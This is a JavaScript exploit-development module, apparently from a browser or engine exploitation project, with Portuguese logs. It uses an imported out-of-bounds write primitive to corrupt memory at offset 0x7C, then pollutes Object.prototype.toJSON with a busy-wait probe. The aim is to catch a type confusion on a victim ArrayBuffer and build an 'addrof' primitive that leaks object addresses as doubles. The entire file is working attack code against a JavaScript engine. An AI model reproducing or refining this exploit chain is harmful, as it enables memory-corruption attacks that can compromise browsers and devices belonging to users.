// js/script3/testArrayBufferVictimCrash.mjs (V6 - Sonda com Busy Wait e Re-check)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V6_BusyWaitProbe";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v28 = null;
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug com Sonda Busy Wait/Re-check ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    toJSON_call_details_v28 = {
        probe_variant: "V6_BusyWaitProbe",
        type_observed_in_probe: "N/A",
        initial_type_in_probe: "N/A",
        final_type_before_write_in_probe: "N/A",
        error_in_toJSON: null,
        probe_called: false,
        addrof_write_attempted: false,
        addrof_write_succeeded_assumption: false,
        busy_wait_loops: 0
    };
    victim_ab_ref_for_original_test = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V6_BusyWait" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    const fill_pattern_v6 = 0.123456789101112;

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu no momento certo."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou buffer não está pronto.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`  Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(fill_pattern_v6);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function ProbeCoreExploit_V6_toJSON_BusyWait() {
                    toJSON_call_details_v28.probe_called = true;
                    toJSON_call_details_v28.probe_variant = "V6_BusyWaitProbe_Executed";
                    let currentType = "";

                    try {
                        toJSON_call_details_v28.initial_type_in_probe = Object.prototype.toString.call(this);
                        logS3(`[Probe_V6_BusyWait] Tipo INICIAL de 'this': ${toJSON_call_details_v28.initial_type_in_probe}`, "leak");

                        // Busy wait loop - MUITO CUIDADO, pode congelar o navegador.
                        // Tentar por um máximo de ~10-15ms em pequenos incrementos.
                        const maxBusyWaitDuration = 15; // ms
                        const busyWaitCheckInterval = 1; // ms - não faz sentido ser menor que a precisão do Date.now()
                        let busyWaitLoops = 0;
                        const startTime = Date.now();
                        let typeChangedToObject = false;

                        while(Date.now() - startTime < maxBusyWaitDuration) {
                            busyWaitLoops++;
                            currentType = Object.prototype.toString.call(this);
                            if (currentType === '[object Object]') {
                                typeChangedToObject = true;
                                break;
                            }
                            // Pequena pausa síncrona (busy wait)
                            // Não usar await PAUSE_S3 aqui, pois toJSON é síncrono
                            let spinStartTime = Date.now();
                            while(Date.now() - spinStartTime < busyWaitCheckInterval) { /* spin */ }
                        }
                        toJSON_call_details_v28.busy_wait_loops = busyWaitLoops;
                        toJSON_call_details_v28.final_type_before_write_in_probe = currentType;
                        logS3(`[Probe_V6_BusyWait] Após busy wait (${busyWaitLoops} loops, ${Date.now() - startTime}ms), tipo FINAL de 'this': ${currentType}`, "leak");

                        if (this === victim_ab_ref_for_original_test && typeChangedToObject && object_to_leak_for_addrof_attempt) {
                            logS3(`[Probe_V6_BusyWait] HEISENBUG CONFIRMADA como [object Object]! Tentando escrita de addrof...`, "vuln");
                            this[0] = object_to_leak_for_addrof_attempt;
                            toJSON_call_details_v28.addrof_write_attempted = true;
                            logS3(`[Probe_V6_BusyWait] Escrita (supostamente) realizada.`, "info");
                            toJSON_call_details_v28.addrof_write_succeeded_assumption = true; // Assumindo que a escrita funcionou se não houve erro
                        } else {
                            logS3(`[Probe_V6_BusyWait] Condição para escrita não atendida. Tipo final: ${currentType}, É vítima: ${this === victim_ab_ref_for_original_test}`, "warn");
                        }
                    } catch (e_probe) {
                        toJSON_call_details_v28.error_in_toJSON = `ProbeError: ${e_probe.name}: ${e_probe.message}`;
                        logS3(`[Probe_V6_BusyWait] ERRO na sonda: ${e_probe.message}`, "error");
                    }
                    // Registrar o tipo final observado na sonda, independentemente do caminho
                    toJSON_call_details_v28.type_observed_in_probe = toJSON_call_details_v28.final_type_before_write_in_probe || toJSON_call_details_v28.initial_type_in_probe;
                    return { probe_V6_executed: true, attempted_write: toJSON_call_details_v28.addrof_write_attempted, type_final: toJSON_call_details_v28.type_observed_in_probe };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V6 (Busy Wait).`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno da sonda: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes FINAIS da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.addrof_write_attempted) {
                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_on_victim[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v6) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Escrita para addrof realizada E leitura de double sugere um ponteiro.";
                    if(toJSON_call_details_v28.addrof_write_succeeded_assumption) addrof_result.message += " Sonda confirmou [object Object] pós-escrita.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Escrita para addrof tentada, mas valor lido de float64_view_on_victim[0] não parece ponteiro ou buffer não foi alterado do padrão.";
                    if(toJSON_call_details_v28.addrof_write_succeeded_assumption) addrof_result.message += " Sonda confirmou [object Object] pós-escrita, mas valor do buffer não é ponteiro.";
                    else if (toJSON_call_details_v28.type_observed_in_probe !== '[object Object]') addrof_result.message += ` Sonda observou tipo ${toJSON_call_details_v28.type_observed_in_probe} pós-escrita.`;

                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: AddrWrite OK, AddrVal FAIL`;
                }
            } else {
                addrof_result.message = "Escrita para addrof não foi marcada como tentada pela sonda.";
                if(toJSON_call_details_v28 && toJSON_call_details_v28.error_in_toJSON) addrof_result.message += ` Erro na sonda: ${toJSON_call_details_v28.error_in_toJSON}`;
                else if (toJSON_call_details_v28 && toJSON_call_details_v28.final_type_before_write_in_probe !== '[object Object]') addrof_result.message += ` Tipo final na sonda: ${toJSON_call_details_v28.final_type_before_write_in_probe}.`;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: AddrWrite SKIPPED`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
